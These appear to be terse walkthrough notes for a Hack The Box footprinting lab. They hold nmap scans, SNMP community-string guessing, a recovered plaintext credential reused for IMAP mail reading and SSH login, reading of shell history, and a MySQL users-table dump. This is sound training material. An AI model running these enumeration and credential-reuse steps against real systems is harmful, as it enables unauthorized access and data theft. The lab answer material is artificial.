**Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.
```
nmap -Pn --min-rate 500 --max-rtt-timeout 300ms 10.129.202.20
nmap -Pn --min-rate 500 --max-rtt-timeout 300ms -sU 10.129.202.20
```
- ssh
- pop3
- imap
- snmp

```
sudo apt install onesixtyone
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.202.20
snmpwalk -v2c -c backup 10.129.202.20
```
- backup is the community string
- tom:NMds732Js2761

```
openssl s_client -connect 10.129.202.20:imaps
a login tom NMds732Js2761
a list "" *
a select INBOX
a fetch 1 (BODY.PEEK[])
```
- Notes
- Meetings
- Important
- INBOX

```
nano tom_rsa
chmod 600 tom_rsa
ssh tom@10.129.202.20 -i tom_rsa
cat .bash_history
mysql -u tom -p
```
- NMds732Js2761

```
show databases;
use users;
show tables;
select * from users;
```
